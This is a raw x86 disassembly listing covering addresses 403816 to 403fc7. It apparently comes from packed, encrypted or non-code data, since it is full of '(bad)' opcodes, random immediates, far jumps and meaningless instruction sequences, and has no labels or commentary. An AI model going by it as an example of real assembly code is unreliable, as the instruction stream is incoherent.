  403816:	fild   QWORD PTR ds:0x5dc1c196
  40381c:	jl     0x403839
  40381e:	cs stos BYTE PTR es:[edi],al
  403820:	nop
  403821:	leave  
  403822:	sbb    eax,0xf4a35bb9
  403827:	mov    DWORD PTR [esi-0xc],ecx
  40382a:	and    DWORD PTR [esi-0x74712e4c],ebx
  403830:	fild   WORD PTR [edx+ecx*4]
  403833:	iret   
  403834:	ins    DWORD PTR es:[edi],dx
  403835:	setge  BYTE PTR [ecx+0x59]
  403839:	cmc    
  40383a:	sahf   
  40383b:	setno  al
  40383e:	test   BYTE PTR [edi-0x49d0afdd],al
  403844:	ds (bad) 
  403846:	pop    esp
  403847:	clc    
  403848:	js     0x40385e
  40384a:	push   edi
  40384b:	jae    0x40384b
  40384d:	(bad)  
  40384e:	adc    DWORD PTR [edx],ecx
  403850:	xchg   bh,dh
  403852:	add    ebx,ebx
  403854:	jmp    0xdb63:0x3562e3dc
  40385b:	lods   eax,DWORD PTR ds:[esi]
  40385c:	lahf   
  40385d:	lods   al,BYTE PTR ds:[esi]
  40385e:	dec    edx
  40385f:	push   ss
  403860:	jno    0x403886
  403862:	data16 aaa 
  403864:	fild   WORD PTR [esi+0xc1e6280]
  40386a:	dec    ebp
  40386b:	cmp    al,0xd6
  40386d:	adc    eax,0xd71d64cb
  403872:	pop    ebp
  403873:	xor    eax,0x710761da
  403878:	xlat   BYTE PTR ds:[ebx]
  403879:	fisubr WORD PTR ds:0xd23f5eb8
  40387f:	fbld   TBYTE PTR [ebp-0x55]
  403882:	mov    eax,ds:0xe5447654
  403887:	mov    bh,0x94
  403889:	adc    al,0x52
  40388b:	in     al,0xdc
  40388d:	iret   
  40388e:	outs   dx,DWORD PTR ds:[esi]
  40388f:	xor    eax,0xa49b97f8
  403894:	loopne 0x40390b
  403896:	inc    edx
  403897:	scas   al,BYTE PTR es:[edi]
  403898:	nop
  403899:	or     DWORD PTR [edx+0x5e],esp
  40389c:	sar    BYTE PTR [esi+0x5c],0x3
  4038a0:	test   eax,0xba5dab0c
  4038a5:	or     al,0xad
  4038a7:	xchg   esi,eax
  4038a8:	es test eax,0x37109438
  4038ae:	mov    dl,0x49
  4038b0:	lods   eax,DWORD PTR ds:[esi]
  4038b1:	pushf  
  4038b2:	ret    0x6b2f
  4038b5:	xchg   bh,bl
  4038b7:	ja     0x403860
  4038b9:	pop    ss
  4038ba:	aad    0xcf
  4038bc:	out    dx,al
  4038bd:	in     eax,0x6d
  4038bf:	outs   dx,DWORD PTR ds:[esi]
  4038c0:	dec    esi
  4038c1:	mov    WORD PTR [ebp+0x44],gs
  4038c4:	sti    
  4038c5:	dec    ebx
  4038c6:	mov    ebx,esi
  4038c8:	xchg   edi,eax
  4038c9:	test   eax,0xf4554391
  4038ce:	cmp    bl,bl
  4038d0:	sbb    DWORD PTR [edx],ecx
  4038d2:	ror    BYTE PTR [ebx],1
  4038d4:	cmp    esi,DWORD PTR [edx]
  4038d6:	inc    esp
  4038d7:	and    al,0x61
  4038d9:	test   DWORD PTR [ecx],ecx
  4038db:	fistp  DWORD PTR [ebx-0x33]
  4038de:	xor    al,al
  4038e0:	sub    DWORD PTR [edi-0x9d81fba],ebx
  4038e6:	data16 cld 
  4038e8:	xor    dl,ch
  4038ea:	lods   eax,DWORD PTR ds:[esi]
  4038eb:	rcl    DWORD PTR [ebx],1
  4038ed:	jbe    0x4038ac
  4038ef:	push   ebx
  4038f0:	jmp    0x403894
  4038f2:	sub    eax,0x77adc026
  4038f7:	daa    
  4038f8:	jmp    0x4038c0
  4038fa:	dec    esp
  4038fb:	rcl    DWORD PTR [esp+ebx*2+0x31],1
  4038ff:	cmp    bh,BYTE PTR [ebp+0x426fc961]
  403905:	dec    edi
  403906:	xor    esp,esi
  403908:	fwait
  403909:	mov    ds:0x58a99046,al
  40390e:	stos   DWORD PTR es:[edi],eax
  40390f:	add    DWORD PTR [edi],ebx
  403911:	sbb    BYTE PTR [ecx],ch
  403913:	fist   WORD PTR [ecx-0x17e8c038]
  403919:	mov    dh,0xa0
  40391b:	jb     0x40395b
  40391d:	fidivr DWORD PTR [ebx-0x674e0a5]
  403923:	jmp    0x40394b
  403925:	(bad)  
  403926:	mov    eax,0x6910e8fd
  40392b:	enter  0xf597,0x96
  40392f:	bound  edx,QWORD PTR [eax-0x70]
  403932:	push   ebx
  403933:	stc    
  403934:	adc    eax,0x2c719c88
  403939:	dec    esp
  40393a:	sub    al,bh
  40393c:	adc    BYTE PTR [esi+0x59],bh
  40393f:	jle    0x4038fb
  403941:	push   eax
  403942:	loope  0x403953
  403944:	outs   dx,DWORD PTR ds:[esi]
  403945:	(bad)  
  403946:	stc    
  403947:	in     al,0x2c
  403949:	lock mov esi,0x42a7bb3a
  40394f:	ret    0x40c
  403952:	hlt    
  403953:	test   BYTE PTR [ebp+esi*4-0x3c],bl
  403957:	dec    ebp
  403958:	ja     0x403965
  40395a:	cs std 
  40395c:	shl    dl,cl
  40395e:	inc    DWORD PTR [edx+esi*4]
  403961:	push   ebx
  403962:	mov    ah,0xb5
  403964:	into   
  403965:	adc    DWORD PTR [esi],0x40
  403968:	out    dx,eax
  403969:	es jecxz 0x40399d
  40396c:	aam    0xcf
  40396e:	pop    esi
  40396f:	js     0x40392b
  403971:	rcr    DWORD PTR ds:0x4932ecc3,1
  403977:	cmc    
  403978:	ss xbegin 0x7125634d
  40397f:	mov    ebp,0x3cd36e31
  403984:	adc    eax,0x10d3d50a
  403989:	(bad)  
  40398b:	jg     0x4039bc
  40398d:	retf   
  40398e:	dec    edx
  40398f:	loop   0x40395e
  403991:	(bad)  
  403993:	mov    ecx,0xb9a7123a
  403998:	push   ds
  403999:	jge    0x4039cd
  40399b:	pushf  
  40399c:	add    DWORD PTR ds:0x83a4f3ed,ebx
  4039a2:	or     ebp,0xffffff8e
  4039a5:	sbb    BYTE PTR [ebp+0x3d],bl
  4039a8:	popa   
  4039a9:	aaa    
  4039aa:	add    bh,dl
  4039ac:	inc    esi
  4039ad:	push   0xffffffdc
  4039af:	add    esp,DWORD PTR [esi+edi*4-0x7c0d7563]
  4039b6:	pop    edi
  4039b7:	clc    
  4039b8:	push   ss
  4039b9:	lea    edi,[ecx]
  4039bb:	jo     0x4039c6
  4039bd:	push   ecx
  4039be:	add    ah,bh
  4039c0:	(bad)
  4039c3:	pop    esi
  4039c4:	jns    0x4039c2
  4039c6:	dec    edi
  4039c7:	loopne 0x4039ae
  4039c9:	pop    esp
  4039ca:	or     esp,DWORD PTR [ebp+0x6]
  4039cd:	xor    BYTE PTR [ecx+0x8ef5086],al
  4039d3:	jmp    0x30cda1f0
  4039d8:	push   edx
  4039d9:	imul   esi,DWORD PTR [edx-0x5688cbcb],0xffffffa3
  4039e0:	fcom   QWORD PTR [ecx]
  4039e2:	xchg   ecx,eax
  4039e3:	jnp    0x403a25
  4039e5:	(bad)  
  4039e6:	pop    edi
  4039e7:	xor    al,0xd0
  4039e9:	sub    al,0xdb
  4039eb:	and    dh,BYTE PTR [edx]
  4039ed:	and    bl,al
  4039ef:	sub    BYTE PTR cs:[esi-0x4ebb5f5f],cl
  4039f6:	jmp    0x61ce:0xc2eda2b0
  4039fd:	sbb    DWORD PTR [edi+0xd],ebp
  403a00:	inc    ebp
  403a01:	mov    WORD PTR [ebp+0x3e],es
  403a04:	pop    esp
  403a05:	mov    esi,0x67deb309
  403a0a:	pop    edx
  403a0b:	int    0xe5
  403a0d:	mov    edx,0x5cfde6dc
  403a12:	dec    ebx
  403a13:	mov    WORD PTR [ebx-0x4c],fs
  403a16:	add    ecx,DWORD PTR [ebx+eax*2-0x7e]
  403a1a:	sbb    ecx,DWORD PTR [edi+0x5825d620]
  403a20:	jl     0x4039d3
  403a22:	sub    esp,DWORD PTR [esi]
  403a24:	jmp    0xe35c:0x2ac09165
  403a2b:	jnp    0x4039c4
  403a2d:	mov    DWORD PTR [ebx+0x16],edx
  403a30:	test   BYTE PTR [edx],ch
  403a32:	jo     0x403ab2
  403a34:	int3   
  403a35:	test   DWORD PTR [ebp-0x5a60f82f],eax
  403a3b:	or     cl,ch
  403a3d:	(bad)  
  403a3e:	hlt    
  403a3f:	mov    eax,ecx
  403a41:	xchg   esp,eax
  403a42:	dec    ebx
  403a43:	ror    DWORD PTR [ecx-0x12],cl
  403a46:	xor    eax,0x1f435f09
  403a4b:	addr16 iret 
  403a4d:	and    BYTE PTR [ecx+edx*4+0x1f],0xe2
  403a52:	shl    DWORD PTR [edi-0x99b4d5d],0x1f
  403a59:	cmp    DWORD PTR [edi+0x2e],eax
  403a5c:	lahf   
  403a5d:	hlt    
  403a5e:	shr    BYTE PTR [ecx-0x72],1
  403a61:	(bad)  
  403a62:	call   0x7b232f7e
  403a67:	sbb    al,0x97
  403a69:	or     eax,0x7f92d7ab
  403a6e:	(bad)  
  403a70:	or     eax,0x9105dfbb
  403a75:	mov    BYTE PTR ds:0x7433adc3,dh
  403a7b:	int3   
  403a7c:	dec    ecx
  403a7d:	jmp    0x403a51
  403a7f:	cmp    BYTE PTR [edi+0x79bed98e],0xd0
  403a86:	ins    DWORD PTR es:[edi],dx
  403a87:	xchg   edx,eax
  403a88:	mov    ds:0xfec0225a,eax
  403a8d:	scas   eax,DWORD PTR es:[edi]
  403a8e:	mov    esp,0x2fa95ac3
  403a93:	out    0x5d,al
  403a95:	add    BYTE PTR [edi+0x12],ch
  403a98:	imul   ebx,DWORD PTR [esi],0x7
  403a9b:	(bad)  
  403a9c:	ja     0x403b12
  403a9e:	push   ebx
  403a9f:	xchg   edi,eax
  403aa0:	ins    BYTE PTR es:[edi],dx
  403aa1:	add    ch,ah
  403aa3:	(bad)
  403aa7:	(bad)  [edi+0x7817469a]
  403aad:	int3   
  403aae:	push   esi
  403aaf:	mov    bl,0x4e
  403ab1:	inc    esp
  403ab2:	daa    
  403ab3:	(bad)  
  403ab5:	dec    edx
  403ab6:	cld    
  403ab7:	test   BYTE PTR ds:0x9d072c2e,0xbb
  403abe:	add    BYTE PTR [esi+0x5d],dl
  403ac1:	mov    eax,0x531a70f7
  403ac6:	call   0x4fb5:0x5401dfa4
  403acd:	outs   dx,BYTE PTR ds:[esi]
  403ace:	push   cs
  403acf:	rcr    DWORD PTR [eax],cl
  403ad1:	or     ah,BYTE PTR [ebp+0x61978323]
  403ad7:	adc    ah,BYTE PTR [ebx+0x15e3f69e]
  403add:	frstor [edx+0x10870d56]
  403ae3:	in     al,0x27
  403ae5:	pop    es
  403ae6:	dec    bx
  403ae8:	jle    0x403a70
  403aea:	mov    esp,0x8f482809
  403aef:	popf   
  403af0:	out    dx,al
  403af1:	lods   al,BYTE PTR ds:[esi]
  403af2:	and    ah,0x5c
  403af5:	adc    BYTE PTR [ecx+0x56],bl
  403af8:	push   0x1fb3232d
  403afd:	pop    ebp
  403afe:	adc    ecx,DWORD PTR ds:0xa19b640d
  403b04:	sti    
  403b05:	jg     0x403b77
  403b07:	(bad)  
  403b09:	ss and al,dl
  403b0c:	and    DWORD PTR [eax],ebx
  403b0e:	leave  
  403b0f:	and    al,0x6
  403b11:	shl    BYTE PTR [edx-0x45f6c672],1
  403b17:	pop    ds
  403b18:	pop    eax
  403b19:	(bad)  
  403b1a:	dec    ebx
  403b1b:	shl    ah,cl
  403b1d:	fsub   DWORD PTR [edx-0xf]
  403b20:	mov    edx,0x611ab364
  403b25:	int    0xc2
  403b27:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403b28:	pop    ds
  403b29:	icebp  
  403b2a:	dec    edi
  403b2b:	mov    esp,0x48cdf44a
  403b30:	cmp    eax,0xbb79ccc4
  403b35:	out    0xdf,al
  403b37:	dec    esi
  403b38:	adc    BYTE PTR [ebx],cl
  403b3a:	in     eax,0x61
  403b3c:	mov    dl,0x2a
  403b3e:	mov    eax,0x3622d7c7
  403b43:	ds int3 
  403b45:	sbb    BYTE PTR [edx],cl
  403b47:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403b48:	loop   0x403ba7
  403b4a:	into   
  403b4b:	push   ecx
  403b4c:	sub    edi,DWORD PTR [ebx+esi*4]
  403b4f:	fidiv  WORD PTR [edx]
  403b51:	loope  0x403b0a
  403b53:	or     esi,DWORD PTR [ecx+0xe0f7a3f]
  403b59:	jp     0x403b7e
  403b5b:	xchg   edi,eax
  403b5c:	popa   
  403b5d:	test   al,0x3b
  403b5f:	dec    edx
  403b60:	test   edi,esp
  403b62:	arpl   WORD PTR [ecx-0x29],dx
  403b65:	cld    
  403b66:	cmp    esi,esi
  403b68:	iret   
  403b69:	add    dh,bh
  403b6b:	dec    BYTE PTR gs:[ebp-0x37]
  403b6f:	icebp  
  403b70:	and    al,BYTE PTR [esi-0x50ef464d]
  403b76:	jnp    0x403bc0
  403b78:	or     al,0x5b
  403b7a:	xchg   esi,ebp
  403b7c:	(bad)  
  403b7e:	enter  0xfb50,0xf9
  403b82:	push   esi
  403b83:	xchg   DWORD PTR [edi-0x7f8df029],eax
  403b89:	outs   dx,BYTE PTR ds:[esi]
  403b8a:	pop    ebp
  403b8b:	cmp    esi,DWORD PTR [ecx]
  403b8d:	cmp    eax,ebx
  403b8f:	xchg   esp,eax
  403b90:	fwait
  403b91:	xchg   DWORD PTR ds:0xdb48cfcc,esi
  403b97:	inc    esp
  403b98:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403b99:	fnstcw WORD PTR ss:[ebx-0x10]
  403b9d:	repnz sub BYTE PTR [ecx+edi*1-0x648a40f],al
  403ba5:	neg    ebx
  403ba7:	outs   dx,BYTE PTR ds:[esi]
  403ba8:	ss inc eax
  403baa:	fsubrp st(4),st
  403bac:	mov    bh,ah
  403bae:	xor    BYTE PTR [esi],bh
  403bb0:	test   BYTE PTR [ebx+0x6da6a195],dl
  403bb6:	cmc    
  403bb7:	ror    DWORD PTR [ebp-0x478c306b],0x9d
  403bbe:	in     al,dx
  403bbf:	jno    0x403bc5
  403bc1:	in     eax,dx
  403bc2:	or     edx,DWORD PTR [esp+esi*2-0x1be01a4d]
  403bc9:	(bad)  
  403bca:	scas   eax,DWORD PTR es:[edi]
  403bcb:	call   0x76c7bd6e
  403bd0:	inc    esi
  403bd1:	dec    esp
  403bd2:	popf   
  403bd3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403bd4:	push   ebp
  403bd5:	cmc    
  403bd6:	cmp    al,0xe7
  403bd8:	or     ebx,esi
  403bda:	sahf   
  403bdb:	mov    ebx,0xbc382572
  403be0:	mov    ecx,0xe76d2ec7
  403be5:	sbb    BYTE PTR [ecx+0x332a5fee],ch
  403beb:	or     BYTE PTR [ebx],cl
  403bed:	dec    ecx
  403bee:	stos   BYTE PTR es:[edi],al
  403bef:	add    eax,DWORD PTR [ebp+0x73]
  403bf2:	adc    al,0x8e
  403bf5:	fs dec eax
  403bf7:	push   ecx
  403bf8:	(bad)  
  403bf9:	jb     0x403bcd
  403bfb:	xchg   ebx,eax
  403bfc:	xor    esi,eax
  403bfe:	push   bp
  403c00:	inc    ebx
  403c01:	out    0x8d,eax
  403c03:	test   al,0xf8
  403c05:	jge    0x403ba7
  403c07:	ret    0xe757
  403c0a:	aad    0x7e
  403c0c:	adc    eax,0xfbd36c5
  403c11:	sbb    BYTE PTR [eax-0x44ae282c],dl
  403c17:	dec    esi
  403c18:	and    BYTE PTR [edi],bh
  403c1a:	xchg   edx,edi
  403c1c:	in     eax,0x2d
  403c1e:	or     BYTE PTR [ebx+ebx*8],0xf
  403c22:	inc    ecx
  403c23:	lock add al,0x74
  403c26:	jle    0x403c83
  403c28:	loopne 0x403c25
  403c2a:	and    BYTE PTR [ebx],bh
  403c2c:	scas   al,BYTE PTR es:[edi]
  403c2d:	mov    al,ds:0x3c10cd23
  403c32:	xor    al,BYTE PTR [edx+eiz*1+0x2a]
  403c36:	xchg   edi,eax
  403c37:	mov    esp,0xa849bfda
  403c3c:	jg     0x403c25
  403c3e:	adc    edi,DWORD PTR [edx]
  403c40:	pop    es
  403c41:	ror    DWORD PTR [esi-0x1e],0x14
  403c45:	out    dx,eax
  403c46:	cmp    bh,BYTE PTR [edx+0x27]
  403c49:	lea    edi,[edx]
  403c4b:	jecxz  0x403c52
  403c4d:	scas   al,BYTE PTR es:[edi]
  403c4e:	mov    DWORD PTR [edi+0x59717710],esi
  403c54:	push   ecx
  403c55:	dec    edi
  403c56:	pop    edi
  403c57:	clc    
  403c58:	aam    0x9
  403c5a:	xchg   esp,eax
  403c5b:	xchg   DWORD PTR [ebp+0x33b288d7],edx
  403c61:	and    BYTE PTR [eax-0x64],ch
  403c64:	loop   0x403c36
  403c66:	jns    0x403ce6
  403c68:	icebp  
  403c69:	xchg   ebx,eax
  403c6a:	icebp  
  403c6b:	std    
  403c6c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403c6d:	scas   al,BYTE PTR es:[edi]
  403c6e:	je     0x403bf7
  403c70:	mov    esi,0xdef0eaad
  403c75:	jne    0x403ca2
  403c77:	sub    esp,ebx
  403c79:	xor    eax,0x4175b6db
  403c7e:	jp     0x403ceb
  403c80:	sbb    ah,ch
  403c82:	pop    ss
  403c83:	or     al,0xe0
  403c85:	inc    BYTE PTR [ebp+0x3623d67d]
  403c8b:	jne    0x403cb4
  403c8d:	sub    al,0xbf
  403c8f:	fbld   TBYTE PTR [ebx+0xc]
  403c92:	into   
  403c93:	add    eax,0x1d7560e9
  403c98:	and    al,0xd3
  403c9a:	leave  
  403c9b:	lea    eax,[eax+edi*1+0x5dc9b8b0]
  403ca2:	test   eax,0xfca891bf
  403ca7:	cmp    al,0xbc
  403ca9:	inc    eax
  403caa:	push   eax
  403cab:	fimul  WORD PTR [esi]
  403cad:	jo     0x403c48
  403caf:	jl     0x403ca8
  403cb1:	sbb    al,BYTE PTR [ebx+eiz*4+0x535bdfc1]
  403cb8:	out    0xec,eax
  403cba:	test   al,0xb5
  403cbc:	sbb    bl,0xe
  403cbf:	mov    eax,0x2e000825
  403cc4:	and    eax,0xfffffff4
  403cc7:	fild   DWORD PTR [edi+0x274e2409]
  403ccd:	pusha  
  403cce:	test   BYTE PTR [edi],bh
  403cd0:	adc    eax,0xeadfec4c
  403cd5:	hlt    
  403cd6:	push   edi
  403cd7:	nop
  403cd8:	xor    cl,bh
  403cda:	inc    ecx
  403cdb:	pop    eax
  403cdc:	lods   eax,DWORD PTR ds:[esi]
  403cdd:	adc    al,0xe0
  403cdf:	jmp    0x403cf1
  403ce1:	jno    0x403c84
  403ce3:	or     al,0xba
  403ce5:	fsub   DWORD PTR [esp+ebx*4+0x15d991ac]
  403cec:	sar    DWORD PTR [edx],cl
  403cee:	and    DWORD PTR [ebx],ebp
  403cf0:	stc    
  403cf1:	sti    
  403cf2:	xor    al,0xa1
  403cf4:	clc    
  403cf5:	xor    ebp,DWORD PTR [ecx+0x71]
  403cf8:	inc    eax
  403cf9:	cmp    DWORD PTR [edi+ecx*4],eax
  403cfc:	in     al,dx
  403cfd:	in     al,0x15
  403cff:	fisub  WORD PTR [eax+0x5894a840]
  403d05:	ret    
  403d06:	cs stos BYTE PTR es:[edi],al
  403d08:	lods   eax,DWORD PTR ds:[esi]
  403d09:	mov    esi,0x84ad76f8
  403d0e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403d0f:	xlat   BYTE PTR ds:[ebx]
  403d10:	inc    edx
  403d11:	clc    
  403d12:	iret   
  403d13:	outs   dx,BYTE PTR ds:[esi]
  403d14:	shl    ebx,1
  403d16:	std    
  403d17:	push   ds
  403d18:	sub    al,0x62
  403d1a:	pop    ds
  403d1b:	adc    eax,0x4175aa1a
  403d20:	es inc ecx
  403d22:	cld    
  403d23:	mov    ds:0x65a0ac3f,al
  403d28:	loope  0x403d2c
  403d2a:	inc    esp
  403d2b:	and    esp,ebx
  403d2d:	sti    
  403d2e:	out    dx,al
  403d2f:	sbb    edx,edi
  403d31:	push   esp
  403d32:	push   eax
  403d33:	or     esp,esp
  403d35:	xchg   ecx,eax
  403d36:	(bad)  
  403d37:	fbstp  TBYTE PTR [edx+0x23]
  403d3a:	mov    ds:0x810b0277,eax
  403d3f:	and    eax,0x29068771
  403d44:	or     bl,BYTE PTR ds:0x548882ad
  403d4a:	xchg   edx,eax
  403d4b:	xor    BYTE PTR ds:0xd5ab57d7,0x4c
  403d52:	jecxz  0x403cf8
  403d54:	cmc    
  403d55:	or     DWORD PTR [edi],esi
  403d57:	jmp    0x9ddf6f7b
  403d5c:	mov    al,ds:0x701be277
  403d61:	enter  0xbc5f,0x2f
  403d65:	data16 loope 0x403d9e
  403d68:	(bad)  
  403d69:	dec    ecx
  403d6a:	pop    ebp
  403d6b:	cwde   
  403d6c:	pop    esi
  403d6d:	push   ecx
  403d6e:	push   0x2
  403d70:	ficom  WORD PTR [edx]
  403d72:	mov    al,ds:0x60784e96
  403d77:	rcr    BYTE PTR [edi-0x701b9118],1
  403d7d:	repnz cmp BYTE PTR [esi-0x65],al
  403d81:	popa   
  403d82:	enter  0xbfd0,0x9c
  403d86:	aam    0xe4
  403d88:	pop    es
  403d89:	cld    
  403d8a:	add    ch,BYTE PTR [ebx]
  403d8c:	mov    WORD PTR [edi+0x55358238],?
  403d92:	and    BYTE PTR [ebx-0x167e3797],0x12
  403d99:	mov    ebp,eax
  403d9b:	cmc    
  403d9c:	pushf  
  403d9d:	pop    edi
  403d9e:	ins    DWORD PTR es:[edi],dx
  403d9f:	pop    esp
  403da0:	ja     0x403e18
  403da2:	retf   0x9ece
  403da5:	xchg   edx,eax
  403da6:	push   ss
  403da7:	out    0x99,al
  403da9:	outs   dx,BYTE PTR ds:[esi]
  403daa:	es jbe 0x403da2
  403dad:	cld    
  403dae:	sbb    al,0x4b
  403db0:	sbb    BYTE PTR [ebp-0x2b],ch
  403db3:	mov    ah,0x10
  403db5:	mov    cl,0x74
  403db7:	mov    edi,0x2a94d7ae
  403dbc:	popa   
  403dbd:	(bad)
  403dc0:	cmc    
  403dc1:	lods   al,BYTE PTR ds:[esi]
  403dc2:	js     0x403da2
  403dc4:	mov    ebp,0x22b03e82
  403dc9:	mov    ecx,DWORD PTR [ecx-0x7b]
  403dcc:	pop    esp
  403dcd:	cmp    ebx,ebx
  403dcf:	lahf   
  403dd0:	scas   al,BYTE PTR es:[edi]
  403dd1:	clc    
  403dd2:	fwait
  403dd3:	cld    
  403dd4:	mov    ebx,0x5f009e8e
  403dd9:	mov    WORD PTR [esi+0x166dea2b],ss
  403ddf:	push   ebp
  403de0:	and    eax,0x3edf6a68
  403de5:	inc    ebp
  403de6:	and    eax,0x61de7d2d
  403deb:	xchg   DWORD PTR [eax+0x46],esp
  403dee:	or     BYTE PTR [ecx],0x92
  403df1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403df2:	inc    edi
  403df3:	retf   0x1d3f
  403df6:	idiv   DWORD PTR ds:0x49adb38e
  403dfc:	xor    ebx,DWORD PTR [eax]
  403dfe:	sub    edi,DWORD PTR [ecx]
  403e00:	arpl   WORD PTR [ebx],bp
  403e02:	lods   al,BYTE PTR ds:[esi]
  403e03:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403e04:	cs pop edx
  403e06:	dec    esi
  403e07:	sbb    BYTE PTR [ebp+0x3c211843],0xe9
  403e0e:	dec    eax
  403e0f:	inc    ebp
  403e10:	retf   0x80e8
  403e13:	arpl   WORD PTR [eax+0x9],di
  403e16:	(bad)  [esi-0x20]
  403e19:	mov    esi,0xb6f3bf5f
  403e1e:	jno    0x403dc0
  403e20:	push   edi
  403e21:	gs or  eax,0x214376e8
  403e27:	loope  0x403dd7
  403e29:	or     ebx,DWORD PTR [ebp-0x7705c770]
  403e2f:	add    al,0xea
  403e31:	int3   
  403e32:	push   0xffffffc3
  403e34:	dec    esp
  403e35:	push   esp
  403e36:	clc    
  403e37:	aas    
  403e38:	std    
  403e39:	cmp    eax,0x410e8917
  403e3e:	jo     0x403e14
  403e40:	and    dl,bh
  403e42:	imul   BYTE PTR [eax-0xc]
  403e45:	jno    0x403dfa
  403e47:	pop    ss
  403e48:	pop    esp
  403e49:	inc    ebx
  403e4a:	or     DWORD PTR [ecx],esp
  403e4c:	adc    edx,ebp
  403e4e:	or     al,0xd2
  403e50:	adc    dh,dl
  403e52:	repnz mov ds:0x80fb227a,al
  403e58:	rcl    DWORD PTR [ebx-0x70],cl
  403e5b:	ds xor al,0x44
  403e5e:	inc    ecx
  403e5f:	addr16 (bad) 
  403e61:	lods   al,BYTE PTR ds:[esi]
  403e62:	std    
  403e63:	repnz pop es
  403e65:	and    BYTE PTR [ecx],0x7a
  403e68:	inc    ebp
  403e69:	xor    edx,DWORD PTR [esi-0x55]
  403e6c:	pop    ss
  403e6d:	mov    ch,dl
  403e6f:	shr    DWORD PTR [ecx],1
  403e71:	pop    es
  403e72:	div    ah
  403e74:	jmp    0xe835:0xbcc64890
  403e7b:	arpl   WORD PTR ds:0x89ad4ad0,si
  403e81:	fist   WORD PTR [ebp-0x2287fa5d]
  403e87:	push   edi
  403e88:	inc    ebx
  403e89:	push   cs
  403e8a:	add    DWORD PTR [ebx],ebx
  403e8c:	ror    dl,cl
  403e8e:	sahf   
  403e8f:	or     eax,0xc91d8600
  403e94:	das    
  403e95:	not    DWORD PTR [ecx+0x12f0a106]
  403e9b:	pop    ss
  403e9c:	jb     0x403e9e
  403e9e:	ins    BYTE PTR es:[edi],dx
  403e9f:	outs   dx,BYTE PTR ds:[esi]
  403ea0:	inc    edi
  403ea1:	icebp  
  403ea2:	je     0x403e54
  403ea4:	mov    eax,ds:0x38c7a54d
  403ea9:	(bad)  
  403eaa:	test   BYTE PTR [edx+ebp*2],dh
  403ead:	add    BYTE PTR [ebp+0x4],dl
  403eb0:	gs push ss
  403eb2:	xchg   esi,eax
  403eb3:	jb     0x403ee1
  403eb5:	add    DWORD PTR [ebp-0x3f],0x70d3f85c
  403ebc:	cmc    
  403ebd:	out    0xf6,al
  403ebf:	mov    ecx,0x8edef615
  403ec4:	clc    
  403ec5:	cmp    esi,DWORD PTR [eax]
  403ec7:	adc    edi,DWORD PTR [eax+0x25adfc0a]
  403ecd:	fisubr WORD PTR [eax+0x65]
  403ed0:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403ed2:	test   BYTE PTR [ebx+edx*8],ah
  403ed5:	repnz pop ds
  403ed7:	jb     0x403e88
  403ed9:	out    dx,eax
  403eda:	mov    edx,0x28ac73c0
  403edf:	xor    dl,dl
  403ee1:	out    0xed,eax
  403ee3:	fbstp  TBYTE PTR [ebp-0x35]
  403ee6:	retf   0x4c17
  403ee9:	mov    bl,0xe3
  403eeb:	(bad)  [ebx]
  403eed:	cmc    
  403eee:	mov    ah,0x21
  403ef0:	call   0x7092:0xb00ec012
  403ef7:	pop    edx
  403ef8:	dec    ebp
  403ef9:	scas   eax,DWORD PTR es:[edi]
  403efa:	idiv   al
  403efc:	mov    BYTE PTR [edi+0x62],al
  403eff:	lds    edi,FWORD PTR [ecx-0x4]
  403f02:	mov    BYTE PTR [edi+eiz*1-0x21],0x5d
  403f07:	test   al,0xee
  403f09:	sub    ecx,esp
  403f0b:	mov    dh,0x3b
  403f0d:	rcl    DWORD PTR [ecx+0x5229be55],0xf
  403f14:	mov    esi,0x385d969a
  403f19:	aad    0xcc
  403f1b:	add    DWORD PTR [esi+0x6214d678],edi
  403f21:	lock xchg BYTE PTR [esi-0x6],ch
  403f25:	cmc    
  403f26:	mov    fs,WORD PTR [ebx+0x48]
  403f29:	ret    
  403f2a:	cmp    BYTE PTR [esi-0x7b23055],bh
  403f30:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403f31:	mov    esi,0x3ff87593
  403f36:	int    0xea
  403f38:	adc    DWORD PTR [esi],edi
  403f3a:	inc    ebp
  403f3b:	and    BYTE PTR [ecx+0x3239f7fb],bl
  403f41:	shl    BYTE PTR [edx+0x33ad84a4],0x28
  403f48:	sub    al,BYTE PTR [ebx-0x56]
  403f4b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403f4c:	mov    dh,BYTE PTR [esi-0x35]
  403f4f:	fsubr  QWORD PTR ds:[esp+edi*2]
  403f53:	cld    
  403f54:	imul   eax,DWORD PTR [edx+0x667b3700],0xafa2b6a3
  403f5e:	xor    DWORD PTR ds:0x40fd7fae,eax
  403f64:	push   edx
  403f65:	or     eax,0x501e6f19
  403f6a:	int3   
  403f6b:	add    al,0xe7
  403f6d:	and    al,0xeb
  403f6f:	out    dx,al
  403f70:	mov    dh,0x26
  403f72:	add    BYTE PTR [ebx+0x336348ce],ah
  403f78:	into   
  403f79:	cld    
  403f7a:	and    al,0xb2
  403f7c:	jo     0x403f68
  403f7e:	adc    eax,0x3fc9797e
  403f83:	fisttp QWORD PTR [edi+0x3b]
  403f86:	push   esi
  403f87:	sub    al,0xe2
  403f89:	xchg   ecx,eax
  403f8a:	adc    edx,DWORD PTR [edi+eax*1+0x25fa2568]
  403f91:	xchg   ecx,eax
  403f92:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403f93:	sbb    esp,DWORD PTR [edx+0x7d01c923]
  403f99:	sub    BYTE PTR [edx],0xd0
  403f9c:	jnp    0x403f31
  403f9e:	adc    eax,0xf30c2da4
  403fa3:	(bad)  
  403fa4:	imul   edi,ebx,0xd09cc32e
  403faa:	pushf  
  403fab:	adc    DWORD PTR [eax-0x2c6a8465],esi
  403fb1:	rcr    ah,cl
  403fb3:	sub    BYTE PTR [ebx],ch
  403fb5:	cmp    eax,0xcce4fb78
  403fba:	adc    BYTE PTR [ebx-0x7bd9df87],dh
  403fc0:	arpl   WORD PTR [eax+0xc66f59b],si
  403fc6:	dec    ebx
  403fc7:	jp     0x403f76
